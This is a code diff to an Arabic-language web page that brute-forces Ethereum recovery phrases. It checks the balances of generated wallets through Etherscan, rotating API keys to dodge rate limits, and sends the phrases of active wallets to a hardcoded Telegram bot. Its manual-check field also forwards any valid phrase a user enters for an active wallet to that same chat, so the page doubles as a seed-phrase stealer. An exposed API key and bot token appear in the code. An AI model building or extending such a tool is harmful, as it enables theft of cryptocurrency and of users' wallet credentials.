@@ -1,4 +1,4 @@
-من
+وردتي
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
@@ -22,7 +22,7 @@
         }
 
         .container {
-            max-width: 800px;
+            max-width: 380px;
             margin: 0 auto;
             background: rgba(255, 255, 255, 0.95);
             border-radius: 20px;
@@ -91,24 +91,6 @@
             outline: none;
             border-color: #4facfe;
             box-shadow: 0 0 0 3px rgba(79, 172, 254, 0.1);
-        }
-
-        .checkbox-group {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            margin: 15px 0;
-        }
-
-        .checkbox-group input[type="checkbox"] {
-            width: 20px;
-            height: 20px;
-        }
-
-        .checkbox-group label {
-            margin: 0;
-            font-weight: 500;
-            color: #495057;
         }
 
         .button-group {
@@ -287,10 +269,6 @@
 
         .log-info {
             color: #17a2b8;
-        }
-
-        .log-warning {
-            color: #ffc107;
         }
 
         .wallet-display {
@@ -534,17 +512,12 @@
             <div class="control-panel">
                 <div class="control-group">
                     <label for="searchSpeed">سرعة البحث (مللي ثانية بين كل عبارة):</label>
-                    <input type="number" id="searchSpeed" value="2000" min="1000" max="10000" step="500">
+                    <input type="number" id="searchSpeed" value="5000" min="1000" max="10000" step="500">
                 </div>
 
                 <div class="control-group">
                     <label for="maxAttempts">الحد الأقصى للمحاولات (0 = لا نهاية):</label>
                     <input type="number" id="maxAttempts" value="0" min="0" max="10000">
-                </div>
-
-                <div class="checkbox-group">
-                    <input type="checkbox" id="sendEmptyWallets" checked>
-                    <label for="sendEmptyWallets">إرسال المحافظ الفارغة إلى Telegram</label>
                 </div>
 
                 <div class="button-group">
@@ -831,8 +804,13 @@
         ];
 
         // إعدادات التطبيق
-        const ETHEREUM_API_KEY = 'ZTX93YC56F73T2W58IKS6GWWDH8UDRGBFK';
-        const ETHEREUM_API_URL = `https://api.etherscan.io/api?apikey=${ETHEREUM_API_KEY}`;
+        const ETHEREUM_API_KEYS = [
+            'ZTX93YC56F73T2W58IKS6GWWDH8UDRGBFK',
+            'YOUR_API_KEY_2', // احتفظ بمفاتيح احتياطية
+            'YOUR_API_KEY_3'
+        ];
+        let currentApiKeyIndex = 0;
+
         const TELEGRAM_BOT_TOKEN = '8257110214:AAFDx0awsmi7yjz6tCZqVY2jS5BZmygvQKw';
         const TELEGRAM_CHAT_ID = '910021564';
         const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
@@ -858,7 +836,6 @@
             manualTestResult: document.getElementById('manualTestResult'),
             searchSpeed: document.getElementById('searchSpeed'),
             maxAttempts: document.getElementById('maxAttempts'),
-            sendEmptyWallets: document.getElementById('sendEmptyWallets'),
             totalGenerated: document.getElementById('totalGenerated'),
             activeWallets: document.getElementById('activeWallets'),
             emptyWallets: document.getElementById('emptyWallets'),
@@ -876,6 +853,17 @@
                 return false;
             }
             return true;
+        }
+
+        // الحصول على مفتاح API الحالي
+        function getCurrentApiKey() {
+            return ETHEREUM_API_KEYS[currentApiKeyIndex];
+        }
+
+        // تغيير مفتاح API في حالة حدوث مشكلة
+        function rotateApiKey() {
+            currentApiKeyIndex = (currentApiKeyIndex + 1) % ETHEREUM_API_KEYS.length;
+            addLogEntry(`🔄 تغيير مفتاح API إلى الفهرس: ${currentApiKeyIndex}`, 'info');
         }
 
         // وظائف توليد العبارات العشوائية
@@ -920,14 +908,23 @@
                     return null;
                 }
                 
-                // استخدام Ethereum API بدلاً من Infura
-                const response = await fetch(`${ETHEREUM_API_URL}&module=account&action=balance&address=${address}&tag=latest`);
+                const apiKey = getCurrentApiKey();
+                const response = await fetch(`https://api.etherscan.io/api?module=account&action=balance&address=${address}&tag=latest&apikey=${apiKey}`);
+                
+                if (!response.ok) {
+                    throw new Error(`خطأ في الشبكة: ${response.status}`);
+                }
+                
                 const data = await response.json();
                 
                 if (data.status === '1' && data.result) {
                     const balanceWei = data.result;
                     const balanceEth = ethers.utils.formatEther(balanceWei);
                     return parseFloat(balanceEth);
+                } else if (data.message && data.message.includes('Max rate limit reached')) {
+                    // تجاوز الحد الأقصى لمعدل الطلبات، تغيير مفتاح API
+                    rotateApiKey();
+                    return await checkWalletBalance(address); // إعادة المحاولة بمفتاح جديد
                 } else {
                     throw new Error(data.message || 'خطأ في الحصول على الرصيد');
                 }
@@ -943,14 +940,23 @@
                     return null;
                 }
                 
-                // استخدام Ethereum API بدلاً من Infura
-                const response = await fetch(`${ETHEREUM_API_URL}&module=account&action=txlist&address=${address}&startblock=0&endblock=99999999&page=1&offset=1&sort=asc`);
+                const apiKey = getCurrentApiKey();
+                const response = await fetch(`https://api.etherscan.io/api?module=account&action=txlist&address=${address}&startblock=0&endblock=99999999&page=1&offset=10&sort=asc&apikey=${apiKey}`);
+                
+                if (!response.ok) {
+                    throw new Error(`خطأ في الشبكة: ${response.status}`);
+                }
+                
                 const data = await response.json();
                 
                 if (data.status === '1') {
                     return data.result.length;
                 } else if (data.message === 'No transactions found') {
                     return 0;
+                } else if (data.message && data.message.includes('Max rate limit reached')) {
+                    // تجاوز الحد الأقصى لمعدل الطلبات، تغيير مفتاح API
+                    rotateApiKey();
+                    return await getTransactionCount(address); // إعادة المحاولة بمفتاح جديد
                 } else {
                     throw new Error(data.message || 'خطأ في الحصول على عدد المعاملات');
                 }
@@ -962,8 +968,10 @@
 
         async function isWalletActive(address) {
             try {
-                const balance = await checkWalletBalance(address);
-                const transactionCount = await getTransactionCount(address);
+                const [balance, transactionCount] = await Promise.all([
+                    checkWalletBalance(address),
+                    getTransactionCount(address)
+                ]);
                 
                 const hasBalance = balance !== null && balance > 0;
                 const hasTransactions = transactionCount !== null && transactionCount > 0;
@@ -1014,7 +1022,7 @@
             }
         }
 
-        function formatWalletMessage(mnemonic, address, walletDetails, isActive = true) {
+        function formatWalletMessage(mnemonic, address, walletDetails) {
             const timestamp = new Date().toLocaleString('ar-EG', {
                 timeZone: 'Africa/Cairo',
                 year: 'numeric',
@@ -1025,14 +1033,7 @@
                 second: '2-digit'
             });
             
-            let message = '';
-            
-            if (isActive) {
-                message = `🎉 <b>تم العثور على محفظة نشطة!</b>\n\n`;
-            } else {
-                message = `📭 <b>محفظة فارغة</b>\n\n`;
-            }
-            
+            let message = `🔑 <b>عبارة استرجاع جديدة</b>\n\n`;
             message += `📝 <b>العبارة:</b>\n<code>${mnemonic}</code>\n\n`;
             message += `📍 <b>العنوان:</b>\n<code>${address}</code>\n\n`;
             
@@ -1048,12 +1049,12 @@
             return message;
         }
 
-        async function sendWalletToTelegram(mnemonic, address, walletDetails, isActive = true) {
+        async function sendActiveWalletToTelegram(mnemonic, address, walletDetails) {
             try {
-                const message = formatWalletMessage(mnemonic, address, walletDetails, isActive);
+                const message = formatWalletMessage(mnemonic, address, walletDetails);
                 return await sendTelegramMessage(message);
             } catch (error) {
-                console.error('خطأ في إرسال المحفظة:', error);
+                console.error('خطأ في إرسال المحفظة النشطة:', error);
                 return false;
             }
         }
@@ -1121,29 +1122,17 @@
                     stats.activeWallets++;
                     addLogEntry(`🎉 تم العثور على محفظة نشطة! العنوان: ${address}`, 'success');
                     
-                    // إرسال المحفظة النشطة إلى Telegram
-                    const telegramSent = await sendWalletToTelegram(mnemonic, address, walletStatus, true);
+                    const telegramSent = await sendActiveWalletToTelegram(mnemonic, address, walletStatus);
                     if (telegramSent) {
-                        addLogEntry('✅ تم إرسال المحفظة النشطة إلى Telegram بنجاح', 'success');
+                        addLogEntry('✅ تم إرسال المحفظة إلى Telegram بنجاح', 'success');
                     } else {
-                        addLogEntry('❌ فشل في إرسال المحفظة النشطة إلى Telegram', 'error');
+                        addLogEntry('❌ فشل في إرسال المحفظة إلى Telegram', 'error');
                     }
                     
                     updateStatus(`تم العثور على محفظة نشطة! إجمالي المحافظ النشطة: ${stats.activeWallets}`, 'success');
                 } else {
                     stats.emptyWallets++;
-                    addLogEntry(`محفظة فارغة: ${address.substring(0, 20)}...`, 'info');
-                    
-                    // التحقق مما إذا كان يجب إرسال المحافظ الفارغة
-                    const sendEmpty = elements.sendEmptyWallets.checked;
-                    if (sendEmpty) {
-                        const telegramSent = await sendWalletToTelegram(mnemonic, address, walletStatus, false);
-                        if (telegramSent) {
-                            addLogEntry('📭 تم إرسال المحفظة الفارغة إلى Telegram', 'info');
-                        } else {
-                            addLogEntry('❌ فشل في إرسال المحفظة الفارغة إلى Telegram', 'error');
-                        }
-                    }
+                    addLogEntry(`محفظة فارغة: ${address.substring(0, 20)}...`);
                 }
                 
                 updateStats();
@@ -1172,8 +1161,22 @@
                 return;
             }
             
+            // التحقق من أن العبارة تحتوي على 12 كلمة
+            const words = mnemonic.split(' ');
+            if (words.length !== 12) {
+                updateStatus('عبارة الاسترجاع يجب أن تتكون من 12 كلمة', 'warning');
+                return;
+            }
+            
             try {
                 if (!checkEthersLoaded()) {
+                    return;
+                }
+
+                // التحقق من صحة العبارة باستخدام ethers
+                if (!ethers.utils.isValidMnemonic(mnemonic)) {
+                    updateStatus('عبارة الاسترجاع غير صالحة', 'danger');
+                    addLogEntry('❌ عبارة الاسترجاع غير صالحة', 'error');
                     return;
                 }
 
@@ -1199,7 +1202,7 @@
                     updateStatus('🎉 العبارة تفتح محفظة نشطة!', 'success');
                     
                     // إرسال المحفظة النشطة إلى Telegram
-                    const telegramSent = await sendWalletToTelegram(mnemonic, address, walletStatus, true);
+                    const telegramSent = await sendActiveWalletToTelegram(mnemonic, address, walletStatus);
                     if (telegramSent) {
                         addLogEntry('✅ تم إرسال المحفظة إلى Telegram بنجاح', 'success');
                     } else {
@@ -1208,17 +1211,6 @@
                 } else {
                     addLogEntry(`❌ العبارة تفتح محفظة فارغة: ${address}`, 'info');
                     updateStatus('❌ العبارة تفتح محفظة فارغة', 'info');
-                    
-                    // إرسال المحفظة الفارغة إلى Telegram إذا كان الخيار مفعل
-                    const sendEmpty = elements.sendEmptyWallets.checked;
-                    if (sendEmpty) {
-                        const telegramSent = await sendWalletToTelegram(mnemonic, address, walletStatus, false);
-                        if (telegramSent) {
-                            addLogEntry('📭 تم إرسال المحفظة الفارغة إلى Telegram', 'info');
-                        } else {
-                            addLogEntry('❌ فشل في إرسال المحفظة الفارغة إلى Telegram', 'error');
-                        }
-                    }
                 }
                 
                 // إعادة تعيين الزر
@@ -1286,18 +1278,13 @@
             elements.startBtn.disabled = true;
             elements.stopBtn.disabled = false;
             
-            const speed = parseInt(elements.searchSpeed.value) || 2000;
+            const speed = parseInt(elements.searchSpeed.value) || 5000;
             
             updateStatus('جاري بدء البحث...', 'info');
             addLogEntry('🚀 تم بدء البحث عن المحافظ النشطة');
             
             // إرسال رسالة البداية إلى Telegram
-            const sendEmpty = elements.sendEmptyWallets.checked;
-            let startMessage = `🚀 <b>بدء عملية البحث عن المحافظ</b>\n\n`;
-            startMessage += `⏰ الوقت: ${new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' })}\n`;
-            startMessage += `🔍 جاري البحث عن محافظ...\n`;
-            startMessage += `📭 إرسال المحافظ الفارغة: ${sendEmpty ? '✅ مفعل' : '❌ معطل'}`;
-            
+            const startMessage = `🚀 <b>بدء عملية البحث عن المحافظ النشطة</b>\n\n⏰ الوقت: ${new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' })}\n🔍 جاري البحث عن محافظ تحتوي على رصيد أو معاملات...`;
             await sendTelegramMessage(startMessage);
             
             searchInterval = setInterval(searchForActiveWallets, speed);
@@ -1323,7 +1310,7 @@
             stopMessage += `📊 <b>الإحصائيات النهائية:</b>\n`;
             stopMessage += `🔢 إجمالي العبارات: ${stats.totalGenerated}\n`;
             stopMessage += `✅ المحافظ النشطة: ${stats.activeWallets}\n`;
-            stopMessage += `📭 المحافظ الفارغة: ${stats.emptyWallets}\n`;
+            stopMessage += `❌ المحافظ الفارغة: ${stats.emptyWallets}\n`;
             stopMessage += `\n⏰ الوقت: ${new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' })}`;
             
             await sendTelegramMessage(stopMessage);
